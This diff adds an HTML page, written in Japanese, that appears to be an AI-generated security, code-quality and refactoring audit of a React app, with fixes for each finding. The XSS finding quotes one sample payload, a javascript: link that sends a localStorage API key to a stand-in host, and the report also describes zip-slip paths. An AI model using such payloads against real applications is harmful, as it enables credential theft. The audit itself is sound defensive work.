@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>packages/app 調査・分析レポート — 2026-06-12</title>
+<style>
+  :root {
+    --bg: #0f1117;
+    --surface: #181b24;
+    --surface2: #1f2330;
+    --border: #2c3142;
+    --text: #e6e8ee;
+    --muted: #9aa1b2;
+    --accent: #7aa2f7;
+    --critical: #f7768e;
+    --high: #ff9e64;
+    --medium: #e0af68;
+    --low: #9ece6a;
+    --info: #7dcfff;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: "Hiragino Sans", "Noto Sans JP", -apple-system, "Segoe UI", sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+  }
+  .container { max-width: 1080px; margin: 0 auto; padding: 0 24px 80px; }
+  header {
+    padding: 48px 0 32px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 32px;
+  }
+  header h1 { font-size: 26px; margin: 0 0 8px; }
+  header .meta { color: var(--muted); font-size: 14px; }
+  h2 {
+    font-size: 21px;
+    margin: 48px 0 16px;
+    padding-bottom: 8px;
+    border-bottom: 2px solid var(--border);
+  }
+  h2 .count { font-size: 14px; color: var(--muted); font-weight: normal; margin-left: 8px; }
+  code, .mono {
+    font-family: "SF Mono", "Cascadia Code", Consolas, monospace;
+    font-size: 0.88em;
+    background: var(--surface2);
+    padding: 1px 5px;
+    border-radius: 4px;
+  }
+  /* summary cards */
+  .summary-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; margin: 24px 0; }
+  .stat {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px 18px;
+  }
+  .stat .num { font-size: 30px; font-weight: 700; }
+  .stat .label { color: var(--muted); font-size: 13px; }
+  /* severity bar */
+  .sevbar { display: flex; height: 12px; border-radius: 6px; overflow: hidden; margin: 8px 0 4px; }
+  .legend { display: flex; gap: 16px; font-size: 12px; color: var(--muted); flex-wrap: wrap; }
+  .dot { display: inline-block; width: 9px; height: 9px; border-radius: 50%; margin-right: 4px; }
+  /* finding cards */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--border);
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin: 14px 0;
+  }
+  .card.high { border-left-color: var(--high); }
+  .card.medium { border-left-color: var(--medium); }
+  .card.low { border-left-color: var(--low); }
+  .card h3 { margin: 0 0 6px; font-size: 16px; display: flex; align-items: baseline; gap: 10px; flex-wrap: wrap; }
+  .badge {
+    font-size: 11px;
+    font-weight: 700;
+    padding: 2px 9px;
+    border-radius: 999px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    white-space: nowrap;
+  }
+  .badge.high { background: rgba(255,158,100,.15); color: var(--high); }
+  .badge.medium { background: rgba(224,175,104,.15); color: var(--medium); }
+  .badge.low { background: rgba(158,206,106,.15); color: var(--low); }
+  .badge.effort { background: rgba(122,162,247,.15); color: var(--accent); }
+  .card .loc { font-size: 13px; color: var(--muted); margin-bottom: 6px; }
+  .card p { margin: 6px 0; font-size: 14.5px; }
+  .card .fix { color: var(--info); font-size: 14px; }
+  .card .fix::before { content: "対策: "; font-weight: 700; }
+  a.issue {
+    color: var(--accent);
+    text-decoration: none;
+    font-weight: 600;
+    font-size: 13.5px;
+  }
+  a.issue:hover { text-decoration: underline; }
+  /* safe list */
+  ul.safe { list-style: none; padding: 0; columns: 2; column-gap: 32px; }
+  ul.safe li {
+    font-size: 13.5px;
+    color: var(--muted);
+    padding: 4px 0 4px 22px;
+    position: relative;
+    break-inside: avoid;
+  }
+  ul.safe li::before { content: "✓"; color: var(--low); position: absolute; left: 0; font-weight: 700; }
+  table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14px; }
+  th, td { text-align: left; padding: 9px 12px; border-bottom: 1px solid var(--border); }
+  th { color: var(--muted); font-weight: 600; font-size: 12.5px; text-transform: uppercase; letter-spacing: .04em; }
+  .note {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px 18px;
+    font-size: 14px;
+    color: var(--muted);
+    margin: 16px 0;
+  }
+  ol.order li { margin: 6px 0; font-size: 14.5px; }
+  @media (max-width: 760px) {
+    .summary-grid { grid-template-columns: repeat(2, 1fr); }
+    ul.safe { columns: 1; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+<header>
+  <h1>packages/app 調査・分析レポート</h1>
+  <div class="meta">
+    対象: <code>karasu/packages/app</code>（Vite + React プレビューUI / ソース 190 ファイル）<br>
+    実施日: 2026-06-12 ・ 分析手法: セキュリティ / コード品質 / リファクタリングの3観点並列レビュー + <code>pnpm audit</code><br>
+    全 25 件の指摘を GitHub Issue <a class="issue" href="https://github.com/kompiro/karasu/issues/1525">#1525</a>〜<a class="issue" href="https://github.com/kompiro/karasu/issues/1549">#1549</a> として起票済み
+  </div>
+</header>
+
+<section>
+  <h2 style="margin-top:0">サマリー</h2>
+  <div class="summary-grid">
+    <div class="stat"><div class="num" style="color:var(--critical)">5</div><div class="label">セキュリティ指摘<br>(High 1 / Med 1 / Low 3)</div></div>
+    <div class="stat"><div class="num" style="color:var(--high)">10</div><div class="label">コード品質・バグ<br>(High 2 / Med 5 / Low 3)</div></div>
+    <div class="stat"><div class="num" style="color:var(--accent)">10</div><div class="label">リファクタリング機会<br>(High 2 / Med 6 / Low 2)</div></div>
+    <div class="stat"><div class="num" style="color:var(--low)">0</div><div class="label">依存パッケージ脆弱性<br>(app 配下)</div></div>
+  </div>
+  <div class="sevbar">
+    <div style="flex:3;background:var(--high)"></div>
+    <div style="flex:12;background:var(--medium)"></div>
+    <div style="flex:10;background:var(--low)"></div>
+  </div>
+  <div class="legend">
+    <span><span class="dot" style="background:var(--high)"></span>High 3</span>
+    <span><span class="dot" style="background:var(--medium)"></span>Medium 12</span>
+    <span><span class="dot" style="background:var(--low)"></span>Low 10</span>
+  </div>
+  <p>
+    総評: コードベースは React の基礎（リスナー/タイマーのクリーンアップ、context のメモ化、Radix ベースのダイアログ）は概ね良好。
+    弱点は2テーマに集中している — <strong>非同期ライフサイクルの穴</strong>（compile フック・チャット・ファイル選択で実行中処理がキャンセルされない）と、
+    <strong>永続化フローのサイレント失敗</strong>（import/export/CRUD の失敗が無通知、ブートストラップとメタデータ索引は OPFS の一時障害でアプリ停止・プロジェクト一覧消失に至り得る）。
+    セキュリティでは <code>.krs</code> 由来のリンク URL がスキーム未検証で <code>href</code> に渡る XSS が最重要。
+  </p>
+</section>
+
+<section>
+  <h2>🔐 セキュリティ <span class="count">5件 — Issues #1525〜#1529</span></h2>
+
+  <div class="card high">
+    <h3><span class="badge high">High</span>XSS: <code>.krs</code> 由来の link URL がスキーム未検証で <code>href</code> にレンダリング <a class="issue" href="https://github.com/kompiro/karasu/issues/1525">#1525</a></h3>
+    <div class="loc">src/components/NodeDetailPanel.tsx:122 ・ packages/core/src/parser/parser.ts:645</div>
+    <p>パーサーは <code>link</code> の URL を無検証で保持し、React 19 は <code>javascript:</code> href をブロックしない（dev 警告のみ）。共有・ZIP インポートされた .krs に <code>link "javascript:fetch('//evil/?k='+localStorage[...])"</code> を仕込めば、クリックでアプリ origin 上の任意 JS が実行され、localStorage の Anthropic API キーを窃取可能。</p>
+    <p class="fix"><code>new URL()</code> でパースし <code>http:</code>/<code>https:</code>/<code>mailto:</code> のみ許可。理想的には parse 時（<code>parseLink</code>）に強制し全レンダリング面を保護。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Medium</span>ZIP インポートの zip-slip パストラバーサル（memory-storage モード） <a class="issue" href="https://github.com/kompiro/karasu/issues/1526">#1526</a></h3>
+    <div class="loc">src/utils/import-project-zip.ts:42-50 ・ src/fs/project-manager.ts:78-81</div>
+    <p>エントリのフィルタは拡張子サフィックスのみで <code>../../foo.krs</code> が通過。memory モードでは <code>normalizePath</code> が <code>..</code> を畳むためプロジェクトルートを脱出し、他プロジェクトのファイルやメタデータを上書き可能。影響は同一 origin の仮想 FS 内に限定（実 FS には到達しない）。OPFS モードでは偶然防がれているが importer 側で保証すべき。</p>
+    <p class="fix"><code>parseZipForImport</code> で <code>..</code> セグメント・先頭 <code>/</code>・バックスラッシュを含むパスを拒否し、正規化後にルート内に収まることを書き込み前に検証。</p>
+  </div>
+
+  <div class="card low">
+    <h3><span class="badge low">Low</span>ZIP インポートに解凍爆弾・エントリ数ガードがない <a class="issue" href="https://github.com/kompiro/karasu/issues/1527">#1527</a></h3>
+    <div class="loc">src/utils/import-project-zip.ts:38</div>
+    <p><code>unzipSync</code> がフィルタ前に全エントリをメモリ展開するため、高圧縮の zip bomb でタブをメモリ枯渇・クラッシュさせられる（クライアントサイド DoS）。</p>
+    <p class="fix">展開後合計サイズとエントリ数に上限を設け、超過時はユーザー向けエラーで拒否。</p>
+  </div>
+
+  <div class="card low">
+    <h3><span class="badge low">Low</span>API キーの localStorage 永続化が XSS 窃取窓を拡大 <a class="issue" href="https://github.com/kompiro/karasu/issues/1528">#1528</a></h3>
+    <div class="loc">src/utils/api-key-storage.ts:20-31 ・ src/hooks/useChatSession.ts:149</div>
+    <p>ブラウザ内キー保持は意図された設計（設定画面に警告あり、デフォルトは session、送信先は api.anthropic.com のみ）。残存リスクはオプトインの <code>local</code> 設定がセッションを跨いで同一 origin スクリプトから読める点で、#1525 の XSS を直接増幅する。</p>
+    <p class="fix">まず XSS 側を修正。加えて <code>local</code> オプションの警告強化、session のみ化、またはメモリ保持のみを検討。</p>
+  </div>
+
+  <div class="card low">
+    <h3><span class="badge low">Low</span>「Open All Views」: <code>noopener</code> なし window.open + Blob URL 未解放 <a class="issue" href="https://github.com/kompiro/karasu/issues/1529">#1529</a></h3>
+    <div class="loc">src/components/PreviewColumn.tsx:159-164</div>
+    <p>同一 call site の小粒 2 件。中身はエスケープ済み同一 origin SVG なので実害は薄いが、<code>noopener</code> 欠落と、クリック毎にマルチダイアグラム SVG の Blob がタブ存続中メモリに残留する（他の call site は全て revoke 済み）。</p>
+    <p class="fix"><code>window.open(url, "_blank", "noopener")</code> + 遅延 <code>revokeObjectURL</code>。</p>
+  </div>
+
+  <h3 style="margin-top:28px;font-size:16px">検証済み・安全と確認した項目</h3>
+  <ul class="safe">
+    <li>SVG 描画の <code>dangerouslySetInnerHTML</code> — core 側で全テキスト/属性が <code>escapeXml</code> 通過</li>
+    <li>SVG 内ハイパーリンク — 内部フラグメント <code>#krs-...</code> のみ生成、ユーザー URL は出力されない</li>
+    <li>Markdown 描画（ChatPane / NodeDetailPanel）— <code>marked</code> 出力は常に DOMPurify 通過</li>
+    <li>ピクトグラム HTML — 信頼済みビルトインレジストリ由来のみ</li>
+    <li>全レイヤー <code>iframe srcDoc</code> — <code>sandbox</code> で <code>allow-scripts</code> なし</li>
+    <li>Anthropic キー送信 — カスタム baseURL なし、ログにキー含まれず</li>
+    <li><code>postMessage</code> リスナー / <code>eval</code> / <code>new Function</code> — 使用なし</li>
+    <li>プロトタイプ汚染シンク — ユーザー JSON のオブジェクトマージなし</li>
+    <li>エクスポートファイル名サニタイズ — 用途に対して十分</li>
+    <li>Blob ダウンロード系ヘルパー — ローカル生成コンテンツのみ、revoke 済み</li>
+    <li>依存パッケージ（app 直下）— <code>pnpm audit</code> で脆弱性 0 件（検出された tmp / qs の 2 件はいずれも <code>packages/vscode-e2e</code> の devDependencies 由来）</li>
+  </ul>
+</section>
+
+<section>
+  <h2>🐛 コード品質・バグ <span class="count">10件 — Issues #1530〜#1539</span></h2>
+
+  <div class="card high">
+    <h3><span class="badge high">High</span>ブートストラップにエラーハンドリングがなく「Loading...」のまま永久停止し得る <a class="issue" href="https://github.com/kompiro/karasu/issues/1530">#1530</a></h3>
+    <div class="loc">src/hooks/useProjectInitialization.ts:78-117 ・ src/ProjectModeApp.tsx:217-219</div>
+    <p>初期化 IIFE に try/catch がなく <code>SET_LOADING false</code> が最終行のため、OPFS 不可（プライベートブラウジング等）や quota 超過で throw すると全画面が Loading のまま固まる。StrictMode の二重実行でシードが二重投入される可能性もある。</p>
+    <p class="fix">try/catch/finally + エラー UI、シード済みガードの追加。</p>
+  </div>
+
+  <div class="card high">
+    <h3><span class="badge high">High</span>ProjectManager の read-modify-write がプロジェクト索引を消失させ得る <a class="issue" href="https://github.com/kompiro/karasu/issues/1531">#1531</a></h3>
+    <div class="loc">src/fs/project-manager.ts:48-55, 84-86</div>
+    <p><code>listProjects()</code> が JSON parse 失敗を含む全エラーを握りつぶして <code>[]</code> を返すため、一時的な読み取り失敗の直後に create/import すると <strong>メタデータ全体が 1 エントリで上書き</strong>され他プロジェクトが UI から消える。同時 create の競合でも書き込みが失われる。</p>
+    <p class="fix">「ファイル不存在」と「読み取り/parse エラー」を区別し後者は rethrow、mutation を promise チェーンで直列化。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Medium</span>import/export/snapshot/プロジェクト CRUD の失敗が完全にサイレント <a class="issue" href="https://github.com/kompiro/karasu/issues/1532">#1532</a></h3>
+    <div class="loc">src/ProjectModeApp.tsx:147-166, 198-211 ・ src/components/ProjectSelector.tsx:113-120</div>
+    <p>壊れた ZIP のインポート、OPFS 読み取り失敗時のエクスポート、スナップショット失敗、CRUD 失敗のいずれもユーザーへのフィードバックが皆無（unhandled rejection）。</p>
+    <p class="fix">ハンドラで catch して既存の <code>export-error</code> パターン（PreviewColumn.tsx:294-305）を再利用しトースト/バナー表示。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Medium</span>チャットのセッションリセットが実行中 API 呼び出しをキャンセルしない <a class="issue" href="https://github.com/kompiro/karasu/issues/1533">#1533</a></h3>
+    <div class="loc">src/hooks/useChatSession.ts:128-130, 229-271</div>
+    <p>プロジェクト切替時、旧プロジェクトについての応答が新セッションに混入。さらに stale 応答内の <code>navigate_view</code> ツールが新プロジェクトのダイアグラムを旧パスへナビゲートする。</p>
+    <p class="fix">世代カウンタ or AbortController を ref に保持し、リセットで bump/abort、世代不一致の結果は破棄。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Medium</span>debounce 付き compile フックが実行中 compile をキャンセルせず stale なダイアグラムで上書き <a class="issue" href="https://github.com/kompiro/karasu/issues/1534">#1534</a></h3>
+    <div class="loc">src/hooks/useSystemView.ts:160-293（useDeployView / useOrgView も同パターン）</div>
+    <p>cleanup は <code>clearTimeout</code> のみ。タイマー発火後の compile はキャンセル不能で、高速なファイル/プロジェクト切替時に旧 compile が後着し前のエントリパスの結果が表示される。fingerprint ガードは異なる fingerprint を受理してしまうため防げない。<code>useResolvedCompareSource</code> には正しい cancelled フラグ実装が既にある。</p>
+    <p class="fix">effect 内 <code>cancelled</code> フラグを cleanup で立て、各 <code>setState</code> 前にチェック（#1540 の共通フック抽出と併せて修正するのが最善）。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Medium</span>自動保存: 非直列の OPFS 書き込み + echo ガードの穴でエディタ内容が巻き戻る <a class="issue" href="https://github.com/kompiro/karasu/issues/1535">#1535</a></h3>
+    <div class="loc">src/components/AppShell.tsx:256-272 ・ src/hooks/useEditorExternalRefresh.ts:58-72</div>
+    <p>キーストローク毎の <code>writeFile</code> が直列化されておらず、古い書き込みが後からコミットされると外部更新検知が stale 内容を <code>UPDATE_FILE_CONTENT</code> でディスパッチし、直近の入力が目に見えて巻き戻り消失する。</p>
+    <p class="fix">パス毎に書き込みを promise チェーンで直列化、または自己書き込みに単調増加トークンを付与して refresh 側で比較。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Medium</span>ファイル選択の競合 + 空コンテンツへのフォールバックがデータ消失経路に <a class="issue" href="https://github.com/kompiro/karasu/issues/1536">#1536</a></h3>
+    <div class="loc">src/hooks/useFileSelection.ts:24-34</div>
+    <p>A→B と連続クリックすると後着の A が勝ち誤ったファイルを表示。さらに一時的な読み取り失敗時に <code>content: ""</code> でディスパッチするため、次の 1 キー入力で実ファイルがほぼ空の内容で上書き保存される。</p>
+    <p class="fix">シーケンス ref で stale 結果を破棄、読み取り失敗時は編集可能な空バッファではなくエラー表示（または再読込成功まで read-only）。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Medium</span>プレビューズーム: React onWheel 内の preventDefault は no-op（passive リスナー） <a class="issue" href="https://github.com/kompiro/karasu/issues/1537">#1537</a></h3>
+    <div class="loc">src/components/PreviewPane.tsx:132-139, 361</div>
+    <p>React 17+ はルートの wheel リスナーを passive 登録するため <code>preventDefault()</code> が効かず、ズーム中に祖先要素（overflow:auto の org-tree ペイン等）もスクロールしてしまう。</p>
+    <p class="fix">effect で <code>addEventListener("wheel", handler, { passive: false })</code> をネイティブ登録（cleanup 付き）。</p>
+  </div>
+
+  <div class="card low">
+    <h3><span class="badge low">Low</span>TranslateDialog: クリップボードコピーとファイル読込がサイレント失敗 <a class="issue" href="https://github.com/kompiro/karasu/issues/1538">#1538</a></h3>
+    <div class="loc">src/components/TranslateDialog.tsx:93-98, 133-135</div>
+    <p><code>void navigator.clipboard.writeText(...)</code>（権限/非フォーカスで普通に reject する）と <code>void file.text().then(...)</code> に catch がない。既存の <code>error</code> state に流し込めばよい。</p>
+  </div>
+
+  <div class="card low">
+    <h3><span class="badge low">Low</span>SettingsPane「Saved」インジケータのタイマーに cleanup と再アームガードがない <a class="issue" href="https://github.com/kompiro/karasu/issues/1539">#1539</a></h3>
+    <div class="loc">src/components/SettingsPane.tsx:25-31</div>
+    <p>2 秒タイマーが unmount 時に残留し、連続保存時は 1 回目のタイマーが 2 回目の表示を早期消去する。ref に保持して再アーム前と cleanup でクリア。</p>
+  </div>
+</section>
+
+<section>
+  <h2>🔧 リファクタリング <span class="count">10件 — Issues #1540〜#1549</span></h2>
+
+  <div class="card high">
+    <h3><span class="badge high">Impact: High</span><span class="badge effort">Effort: M</span>useSystemView / useDeployView / useOrgView の3重複 compile パイプラインを共通フック化 <a class="issue" href="https://github.com/kompiro/karasu/issues/1540">#1540</a></h3>
+    <div class="loc">src/hooks/useSystemView.ts (309行) ・ useDeployView.ts (204行) ・ useOrgView.ts (207行)</div>
+    <p>debounce / fingerprint / last-valid-SVG / recompile トリックの約100行のスキャフォールドが3か所にコピペされ、既にドリフトが発生（useDeployView のみ <code>hadErrors</code> ref が欠落 = 潜在バグ）。汎用 <code>useDebouncedCompile</code> に抽出すれば約250行削減、#1534 のキャンセル修正も一箇所で済む。</p>
+  </div>
+
+  <div class="card high">
+    <h3><span class="badge high">Impact: High</span><span class="badge effort">Effort: M</span>AppShell 神コンポーネントの分解（543行・35キーの context 値） <a class="issue" href="https://github.com/kompiro/karasu/issues/1541">#1541</a></h3>
+    <div class="loc">src/components/AppShell.tsx</div>
+    <p>エディタ文書ライフサイクル・エッジ方向スタイル書き込み・アウトライン導出・レイアウト計算・35プロパティ/45依存配列の <code>previewContextValue</code> 組み立ての5責務が同居。1ビューの SVG 変更で全プレビュー消費者が再レンダリング。<code>useEditorDocument</code> / <code>useEdgeDirectionWriter</code> / <code>useOutline</code> / <code>usePreviewContextValue</code> に抽出して約150行の配線へ。デバッグ <code>console.log</code>（259行目）も削除。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Impact: Med</span><span class="badge effort">Effort: M</span>PreviewColumn の約12か所の三項演算子チェーンを useActiveViewData セレクタに <a class="issue" href="https://github.com/kompiro/karasu/issues/1542">#1542</a></h3>
+    <div class="loc">src/components/PreviewColumn.tsx (376行)</div>
+    <p><code>activeView === "system" ? ... : ... ? ... : ...</code> が svg / diagnostics / viewPath / breadcrumb / warnings 等で反復。正規化した <code>ViewData</code> インターフェースの lookup にすれば約60行削減、第4のビュー追加が機械的になる。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Impact: Med</span><span class="badge effort">Effort: S</span>usePersistedPanelWidth 抽出（EditArea / useEditorWidth の重複） <a class="issue" href="https://github.com/kompiro/karasu/issues/1543">#1543</a></h3>
+    <div class="loc">src/components/EditArea.tsx:32-126 ・ src/hooks/useEditorWidth.ts</div>
+    <p>localStorage 永続化 + clamp + drag state + window リスナー + ダブルクリックリセットの同一パターンが2実装。storage key と min/max のみ差分。raw localStorage アクセス5か所の safe-storage util 化も follow-up 候補。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Impact: Med</span><span class="badge effort">Effort: S</span>状態管理クリーンアップ: dead な isAllLayersOpen・重複 highlight アクション・単一 context の再レンダリング <a class="issue" href="https://github.com/kompiro/karasu/issues/1544">#1544</a></h3>
+    <div class="loc">src/state/app-reducer.ts ・ src/state/app-context.tsx</div>
+    <p><code>SET_ALL_LAYERS_OPEN</code> は誰もディスパッチしない dead code。highlight 系アクションの重複、view-reset フィールドリストの二重管理、キーストローク毎に全 <code>useAppContext</code> 消費者が再レンダリングする単一 context。state/dispatch context 分割で解消。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Impact: Med</span><span class="badge effort">Effort: S</span>AppShell → EditArea → EditPane → ChatPane のパススルー prop drilling 解消 <a class="issue" href="https://github.com/kompiro/karasu/issues/1545">#1545</a></h3>
+    <div class="loc">src/components/EditArea.tsx:17-29, 225-238 ・ EditPane.tsx:76-88</div>
+    <p>EditArea は自身が読まない12 props を宣言・転送、EditPane も12中9を ChatPane へ転送。新しい prop の追加に4ファイル必要。composition（children 渡し）か <code>EditorDocumentContext</code> で解消。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Impact: Med</span><span class="badge effort">Effort: M</span>複雑度最大の箇所にテストがない（AppShell / ProjectModeApp / useDeployView / FileTree 他） <a class="issue" href="https://github.com/kompiro/karasu/issues/1546">#1546</a></h3>
+    <p>75テストファイルあるが最大級のオーケストレータが軒並み未テスト。特に <code>useDeployView</code> は兄弟2つにテストがある中で唯一未テストかつドリフト済み — 最優先で追加。神コンポーネントを直接テストするより、各抽出フックとペアでテストを書く方針。</p>
+  </div>
+
+  <div class="card medium">
+    <h3><span class="badge medium">Impact: Med</span><span class="badge effort">Effort: M</span>ProjectModeApp から useProjectActions / usePasteCompare / useSnapshotCompare を抽出 <a class="issue" href="https://github.com/kompiro/karasu/issues/1547">#1547</a></h3>
+    <div class="loc">src/ProjectModeApp.tsx (301行)</div>
+    <p>プロジェクトライフサイクル・paste-compare 状態機械・スナップショットの3つの無関係なクラスタが同居。フック抽出で約100行の配線になり、#1532 のエラーハンドリング追加と単体テスト化の置き場ができる。</p>
+  </div>
+
+  <div class="card low">
+    <h3><span class="badge low">Impact: Low-Med</span><span class="badge effort">Effort: M</span>ReferencePanel: Dialog/Tabs プリミティブへ移行・同一タブの重複解消・spec スニペットのデータ駆動化 <a class="issue" href="https://github.com/kompiro/karasu/issues/1548">#1548</a></h3>
+    <div class="loc">src/components/ReferencePanel.tsx (585行 — app 最大のコンポーネント)</div>
+    <p>非推奨の手書きオーバーレイ（Esc 不可・focus trap なし — <code>.claude/rules/dialog.md</code> 違反）、i18n キー1つだけ異なる完全同一の2タブ、core の <code>getReference</code> と並行して docs/spec からサイレントにドリフトする約250行のハードコード JSX スニペット。</p>
+  </div>
+
+  <div class="card low">
+    <h3><span class="badge low">Impact: Low</span><span class="badge effort">Effort: S</span>小粒な重複排除3点（krs-patch 再エクスポート / path index 二重走査 / 手書き export メニュー） <a class="issue" href="https://github.com/kompiro/karasu/issues/1549">#1549</a></h3>
+    <p><code>utils/krs-patch.ts</code> は core の純粋な再エクスポートで削除可能。<code>useAppViews</code> の2つのほぼ同一な再帰走査は1回で両マップを構築可能。PreviewColumn の手書きメニューは既存の <code>ui/dropdown-menu.tsx</code> に置換。</p>
+  </div>
+</section>
+
+<section>
+  <h2>📋 推奨対応順序</h2>
+  <ol class="order">
+    <li><strong>#1525</strong>（XSS / link URL スキーム検証）— 唯一の High セキュリティ。修正は小さく効果は最大。#1528 のリスクも同時に縮小</li>
+    <li><strong>#1530 / #1531</strong>（ブートストラップ停止・プロジェクト索引消失）— 永続ユーザーデータに触れる High バグ2件</li>
+    <li><strong>#1536 / #1535</strong>（データ消失系: ファイル選択・自動保存）— 発生すると編集内容が実際に失われる</li>
+    <li><strong>#1544</strong>（reducer/context クリーンアップ）— 小さく独立、再レンダリングノイズ削減</li>
+    <li><strong>#1540 + #1534 + #1546 の useDeployView テスト</strong> — 共通フック抽出と同時にキャンセルバグ修正・ドリフトをテストで固定</li>
+    <li><strong>#1543</strong>（usePersistedPanelWidth）— 自己完結の S サイズ</li>
+    <li><strong>#1541 → #1545 → #1542</strong>（AppShell 分解 → drilling 解消 → active-view セレクタ）— 同じ抽出を共有する連鎖</li>
+    <li><strong>#1547 + #1532</strong>（ProjectModeApp フック抽出 + サイレント失敗修正）— 同じファイルを触るためセットで</li>
+    <li>残り（#1526 #1527 #1529 #1533 #1537 #1538 #1539 #1548 #1549）は独立して随時</li>
+  </ol>
+  <div class="note">
+    依存パッケージ: <code>pnpm audit</code> で検出された 2 件（tmp の path traversal / qs の DoS）はいずれも <code>packages/vscode-e2e</code> → <code>@vscode/vsce</code> の推移的 devDependencies であり、<strong>packages/app の依存には脆弱性なし</strong>。本レポートのスコープ外のため Issue 化していない（必要なら security-alert ワークフローで対応）。
+  </div>
+</section>
+
+<footer style="margin-top:64px;padding-top:24px;border-top:1px solid var(--border);color:var(--muted);font-size:13px">
+  Generated by Claude Code automated analysis — 2026-06-12 ・ 分析エージェント3系統（security / quality / refactoring）+ pnpm audit ・ 対象 commit: 47275ba
+</footer>
+
+</div>
+</body>
+</html>
